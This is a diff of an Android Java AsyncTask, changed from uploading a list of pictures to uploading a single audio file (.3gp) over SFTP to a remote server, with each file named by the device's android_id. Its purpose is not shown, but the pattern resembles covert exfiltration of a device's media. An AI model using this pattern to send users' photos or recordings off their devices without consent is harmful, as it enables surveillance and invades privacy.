@@ -8,21 +8,20 @@ import com.jcraft.jsch.ChannelSftp;
 import com.jcraft.jsch.JSch;
 import com.jcraft.jsch.Session;
 
-import java.util.ArrayList;
 import java.util.Properties;
 
 /**
  * Created by julioxus on 13/03/16.
  */
-public class SendPicturesAsyncTask extends AsyncTask<Context, Void, String> {
+public class SendAudioAsyncTask extends AsyncTask<Context, Void, String> {
 
     private Context context;
-    private ArrayList<String> pictures;
+    private String fileName;
     private String android_id;
 
-    public SendPicturesAsyncTask(Context context, String android_id, ArrayList<String> pictures) {
+    public SendAudioAsyncTask(Context context, String android_id, String fileName) {
         this.context = context;
-        this.pictures = pictures;
+        this.fileName = fileName;
         this.android_id = android_id;
 
     }
@@ -64,18 +63,13 @@ public class SendPicturesAsyncTask extends AsyncTask<Context, Void, String> {
         // Send the pictures to send to the remote server
 
         // Send pictures to server
-        int i = 0;
-        do {
-            try {
-
-                System.out.println("Starting File Upload:");
-                String fsrc = pictures.get(i), fdest = android_id + "-IMG_"+i+".jpg";
-                c.put(fsrc, fdest);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-            i++;
-        }while(i < pictures.size());
+        try {
+            String fsrc = fileName;
+            String fdest = android_id+"audio.3gp";
+            c.put(fsrc, fdest);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
         // Close connection
         c.disconnect();
